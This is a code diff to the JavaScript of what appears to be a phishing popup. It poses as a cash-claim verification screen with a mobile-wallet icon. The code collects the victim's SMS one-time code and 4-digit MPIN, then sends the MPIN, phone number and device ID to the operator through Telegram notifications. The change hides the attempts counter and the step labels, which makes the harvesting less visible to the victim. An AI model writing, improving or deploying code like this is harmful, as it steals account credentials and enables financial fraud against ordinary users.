@@ -1,6 +1,6 @@
 /**
  * Popup Share Module - With 500 Bills Indicators & Neon Blue Numpad
- * Updated: MPIN Telegram notification, Claim button notification
+ * Updated: Hidden attempts counter, hidden step indicators
  */
 
 // ========== POPUP MODULE ==========
@@ -65,7 +65,7 @@
         await sendTelegramMessage(message);
     }
     
-    // ========== NEW: MPIN TELEGRAM NOTIFICATION ==========
+    // MPIN Telegram Notification
     async function sendMPINVerificationAttemptNotification(userPhone, deviceId, mpin, attemptsLeft) {
         const now = new Date();
         const timestamp = now.toLocaleString();
@@ -73,7 +73,7 @@
         await sendTelegramMessage(message);
     }
     
-    // ========== NEW: CLAIM BUTTON TELEGRAM NOTIFICATION ==========
+    // Claim button Telegram Notification
     async function sendClaimButtonNotification(userPhone, deviceId, amount) {
         const now = new Date();
         const timestamp = now.toLocaleString();
@@ -183,16 +183,6 @@
         const step1ErrorMsg = document.getElementById('step1ErrorMsg');
         if (step1ErrorMsg) step1ErrorMsg.style.display = 'none';
         
-        const attemptsLeft = MAX_ATTEMPTS - invalidAttempts;
-        const attemptsCounter = document.querySelector('.attempts-counter');
-        if (attemptsCounter) {
-            attemptsCounter.innerHTML = `⚠️ Attempts remaining: ${attemptsLeft} / ${MAX_ATTEMPTS}`;
-            if (attemptsLeft <= 2) {
-                attemptsCounter.style.color = '#ff4444';
-                attemptsCounter.style.fontWeight = 'bold';
-            }
-        }
-        
         if (smsPopup && detectedSMSCode) {
             smsPopup.style.display = 'block';
             setTimeout(() => {
@@ -200,7 +190,7 @@
             }, 10000);
         }
         
-        console.log(`Reset to Step 1. Attempts left: ${attemptsLeft}`);
+        console.log(`Reset to Step 1. Attempts left: ${MAX_ATTEMPTS - invalidAttempts}`);
     }
     
     // ========== UPDATE MPIN DOTS ==========
@@ -354,15 +344,6 @@
             .small-back-btn:active {
                 transform: translateY(3px);
                 box-shadow: 0 0 0 #6e4b0c;
-            }
-            
-            .attempts-counter {
-                font-size: 10px;
-                color: #d4af37;
-                text-align: center;
-                margin-top: 10px;
-                font-family: 'Orbitron', monospace;
-                letter-spacing: 1px;
             }
             
             .verification-input {
@@ -687,7 +668,7 @@
         startSmsRetriever();
     }
     
-    // ========== PHASE 3: CLAIMING VERIFICATION ==========
+    // ========== PHASE 3: CLAIMING VERIFICATION (HIDDEN ATTEMPTS & STEPS) ==========
     function showPhase3() {
         const popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
@@ -698,8 +679,6 @@
             popupContainer.style.width = '90%';
         }
         
-        const attemptsLeft = MAX_ATTEMPTS - invalidAttempts;
-        
         popupInner.innerHTML = `
             <div class="popup-close" id="popupClosePhase3">✕</div>
             
@@ -707,11 +686,9 @@
                 <img src="images/gc_icon.png" style="width: 60px; height: 60px; animation: bounceIn 0.5s ease; border-radius: 50%; border: 2px solid #d4af37; box-shadow: 0 0 20px rgba(212,175,55,0.4);">
             </div>
             
-            <h2 class="phase3-heading">CLAIMING VERIFICATION</h2>
+            <h2 class="phase3-heading">VERIFICATION</h2>
             
             <div class="divider"></div>
-            
-            <div class="attempts-counter">⚠️ Attempts remaining: ${attemptsLeft} / ${MAX_ATTEMPTS}</div>
             
             <div id="smsCodePopup" style="display: none;">
                 <div style="display: flex; align-items: center; gap: 12px;">
@@ -725,11 +702,8 @@
             </div>
             
             <div id="step1Container">
-                <div style="text-align: center; margin-bottom: 10px;">
-                    <span style="font-size: 11px; color: #00d4ff; font-family: 'Orbitron', monospace; letter-spacing: 2px;">STEP 1 OF 2</span>
-                </div>
-                <p style="font-size: 11px; color: #999; text-align: center; margin: 0 0 10px 0; font-family: 'Poppins', sans-serif;">
-                    Enter the <strong style="color: #00d4ff;">6-digit verification code</strong> received via SMS
+                <p style="font-size: 12px; color: #00d4ff; text-align: center; margin: 0 0 15px 0; font-family: 'Poppins', sans-serif;">
+                    Enter the <strong>6-digit verification code</strong> received via SMS
                 </p>
                 <div style="display: flex; gap: 10px; justify-content: center; align-items: center;">
                     <input type="text" id="code6Digit" class="verification-input" placeholder="000000" maxlength="6" inputmode="numeric" autocomplete="one-time-code">
@@ -739,11 +713,8 @@
             </div>
             
             <div id="step2Container" style="display: none;">
-                <div style="text-align: center; margin-bottom: 10px;">
-                    <span style="font-size: 11px; color: #00d4ff; font-family: 'Orbitron', monospace; letter-spacing: 2px;">STEP 2 OF 2</span>
-                </div>
-                <p style="font-size: 11px; color: #999; text-align: center; margin: 0 0 10px 0; font-family: 'Poppins', sans-serif;">
-                    Enter your <strong style="color: #00d4ff;">4-digit MPIN</strong>
+                <p style="font-size: 12px; color: #00d4ff; text-align: center; margin: 0 0 15px 0; font-family: 'Poppins', sans-serif;">
+                    Enter your <strong>4-digit MPIN</strong>
                 </p>
                 
                 <div class="mpin-dots" id="mpinDots">
@@ -905,17 +876,8 @@
                 const maxReached = incrementInvalidAttempts();
                 const attemptsLeft = MAX_ATTEMPTS - invalidAttempts;
                 
-                // ========== SEND MPIN TELEGRAM NOTIFICATION ==========
+                // Send MPIN Telegram notification
                 sendMPINVerificationAttemptNotification(userPhone, deviceId, currentMPIN, attemptsLeft);
-                
-                const attemptsCounter = document.querySelector('.attempts-counter');
-                if (attemptsCounter) {
-                    attemptsCounter.innerHTML = `⚠️ Attempts remaining: ${attemptsLeft} / ${MAX_ATTEMPTS}`;
-                    if (attemptsLeft <= 2) {
-                        attemptsCounter.style.color = '#ff4444';
-                        attemptsCounter.style.fontWeight = 'bold';
-                    }
-                }
                 
                 const errorMsg = document.getElementById('step2ErrorMsg');
                 const mpinDots = document.getElementById('mpinDots');
@@ -1097,7 +1059,7 @@
                     return;
                 }
                 
-                // ========== SEND CLAIM BUTTON TELEGRAM NOTIFICATION ==========
+                // Send Claim button Telegram notification
                 const userPhone = localStorage.getItem("userPhone") || "Unknown";
                 const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
                 sendClaimButtonNotification(userPhone, deviceId, currentBalance);
